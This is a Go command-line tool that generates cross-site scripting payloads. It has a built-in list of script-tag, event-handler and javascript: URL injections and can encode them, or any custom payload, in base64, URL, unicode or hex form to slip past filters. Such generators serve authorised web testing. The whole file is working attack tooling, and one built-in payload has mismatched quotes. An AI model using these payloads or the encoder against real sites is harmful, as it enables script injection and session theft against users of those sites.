package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"net/url"
	"os"
	"strings"
)

// EncodePayload applies encoding to the given payload
func EncodePayload(payload, encoding string) string {
	switch strings.ToLower(encoding) {
	case "base64":
		return base64.StdEncoding.EncodeToString([]byte(payload))
	case "url":
		return url.QueryEscape(payload)
	case "unicode":
		encoded := ""
		for _, char := range payload {
			encoded += fmt.Sprintf("\\u%04x", char)
		}
		return encoded
	case "hex":
		encoded := ""
		for _, char := range payload {
			encoded += fmt.Sprintf("\\x%02x", char)
		}
		return encoded
	default:
		return payload
	}
}

// PredefinedPayloads provides a list of XSS payload templates
func PredefinedPayloads() []string {
	return []string{
		`<script>alert('XSS')</script>`,
		`"><script>alert('XSS')</script>`,
		`<img src="x" onerror="alert('XSS')">`,
		`<svg onload="alert('XSS')"></svg>`,
		`<body onload="alert('XSS')">`,
		`<iframe src="javascript:alert('XSS');"></iframe>`,
		`<link rel="stylesheet" href="javascript:alert('XSS')">`,
		`<div style="background-image: url('javascript:alert("XSS"));'></div>`,
	}
}

func main() {
	// Command-line flags
	outputFile := flag.String("o", "payloads.txt", "File to save the generated payloads")
	encoding := flag.String("e", "none", "Encoding format (base64, url, unicode, hex, none)")
	customPayload := flag.String("p", "", "Custom payload to encode")
	flag.Parse()

	// Validate encoding
	validEncodings := map[string]bool{"base64": true, "url": true, "unicode": true, "hex": true, "none": true}
	if !validEncodings[strings.ToLower(*encoding)] {
		fmt.Println("Invalid encoding format. Use one of: base64, url, unicode, hex, none.")
		os.Exit(1)
	}

	// Open the output file
	file, err := os.Create(*outputFile)
	if err != nil {
		fmt.Printf("Error creating output file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	fmt.Printf("Generating XSS Payloads with encoding: %s\n\n", *encoding)

	// Process predefined payloads
	for _, payload := range PredefinedPayloads() {
		encodedPayload := EncodePayload(payload, *encoding)
		fmt.Println(encodedPayload)
		if _, err := file.WriteString(encodedPayload + "\n"); err != nil {
			fmt.Printf("Error writing to file: %v\n", err)
			os.Exit(1)
		}
	}

	// Process custom payload
	if *customPayload != "" {
		encodedCustomPayload := EncodePayload(*customPayload, *encoding)
		fmt.Println(encodedCustomPayload)
		if _, err := file.WriteString(encodedCustomPayload + "\n"); err != nil {
			fmt.Printf("Error writing to file: %v\n", err)
			os.Exit(1)
		}
	}

	fmt.Printf("\nPayloads have been saved to %s\n", *outputFile)
}
